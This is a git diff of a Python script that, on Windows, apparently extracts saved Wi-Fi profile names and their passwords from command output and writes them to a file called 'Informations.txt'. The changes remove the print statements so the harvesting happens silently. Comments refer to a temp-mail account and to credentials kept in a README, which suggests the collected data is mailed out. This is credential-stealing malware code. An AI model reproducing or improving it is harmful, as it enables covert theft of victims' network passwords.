@@ -9,7 +9,7 @@ import glob
 
 system_information = "Informations.txt"
 
-# TEMP MAIL (LOOK READ.ME)
+# LOOK READ.ME FOR GET USERNAME AND PASSWORD.
 
 # ==============================
 # ==============================
@@ -58,7 +58,6 @@ if os.name == "nt":
     start = output.find("Profile :")
     end = output.find("\\r\\n")
     substring = output[start:end]
-    print(substring)
     list_of_word = output.split()
     j = 2
     with open(file_path + "\\" + system_information, "a") as f:
@@ -77,7 +76,6 @@ if os.name == "nt":
             except:
                 pass
             next_word = next_word.split('\\r\\n')[0]
-            print(next_word)
             if ':' in next_word:
                 next_word = next_word.split(':')[1]
                 if ' ' in next_word:
@@ -102,7 +100,6 @@ if os.name == "nt":
                         next_word = list_of_words[list_of_words.index(key_content) + i]
                         next_word = next_word.split('\\r\\n\\r\\nCost')[0]
                         next_word = next_word.replace(' ', "\\ ")
-                        print(next_word)
                         i = i + 5
                         with open(file_path + "\\" + system_information, "a") as f:
                             f.write(" : " + next_word + "\n")
